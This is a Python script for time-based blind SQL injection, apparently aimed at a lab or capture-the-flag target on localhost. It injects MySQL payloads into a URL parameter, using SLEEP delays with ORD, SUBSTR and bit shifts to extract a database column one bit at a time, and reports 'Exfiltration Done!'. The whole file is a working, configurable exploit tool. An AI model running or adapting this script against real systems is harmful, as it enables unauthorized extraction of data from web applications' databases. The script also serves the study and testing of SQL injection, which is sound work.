#!/usr/bin/env python3
import requests
import sys
import time

## Config

# The target URL. Must contain '$payload$' where the payload will be inserted.
TARGET = "http://localhost/?id=4$payload$"

# The payload, which must sleep if (ORD(byte) < $test$). Must contain '$index$' and
#   '$byte$' where the character index being tested and current test ordinal character will be inserted.
PAYLOAD = "' AND (ORD(SUBSTR(CAST(emoji as BINARY), $index$ %2B 1, 1)) >> $bit$) %26 1 AND SLEEP(0.2) OR '"

# The payload, which must sleep if (length < $test$).
#   Must contain '$bit$' where the index of the current bit being tested will be inserted.
LENGTH_PAYLOAD = "' AND (LENGTH(CAST(emoji as BINARY)) >> $bit$) %26 1 AND SLEEP(0.2) OR '"

# If a query takes longer than this then the SQL server slept
SQL_SLEPT_THRESHOLD = 0.2

# Optional output file to store binary data in
OUTPUT_FILE = ""

## Config Ends

total_requests = 0


def test(payload="", index="", bit=""):
    """Test if a generic payload sleeps."""
    url = (TARGET
        .replace("$payload$", payload)
        .replace("$index$", str(index))
        .replace("$bit$", str(bit))
    )

    # time query
    start_time = time.time()
    requests.get(url)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SQL_SLEPT_THRESHOLD


def query_bits(bits=8, **kwargs):
    """Query a single byte, one bit at a time."""
    total = 0

    # query byte one bit at a time
    for bit in range(bits):
        total += test(bit=bit, **kwargs) * 2**bit

    return total


def main():
    print("[+] Retrieving data...")

    # find length of data
    length = query_bits(32, payload=LENGTH_PAYLOAD)
    print("[+] Fetching", length, "bytes (8 requests per byte)")
    print("[+] ", end="")

    try:
        if OUTPUT_FILE:
            f = open(OUTPUT_FILE, "wb")

        # fetch data
        for i in range(length):
            byte = query_bits(payload=PAYLOAD, index=i)

            if OUTPUT_FILE:
                f.write(bytes([byte]))
                print(".", end="", flush=True)
            else:
                print(chr(byte), end="", flush=True)

    finally:
        if OUTPUT_FILE:
            f.close()

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    if not "$payload$" in TARGET:
        print("Missing '$payload$' in TARGET config string.")
        sys.exit(1)
    if not "$index$" in PAYLOAD:
        print("Missing '$index$' in PAYLOAD config string.")
        sys.exit(2)
    if not "$bit$" in PAYLOAD:
        print("Missing '$bit$' in PAYLOAD config string.")
        sys.exit(3)
    if not "$bit$" in LENGTH_PAYLOAD:
        print("Missing '$bit$' in LENGTH_PAYLOAD config string.")
        sys.exit(4)

    try:
        main()
    except KeyboardInterrupt:
        print("\nCancelled by user")
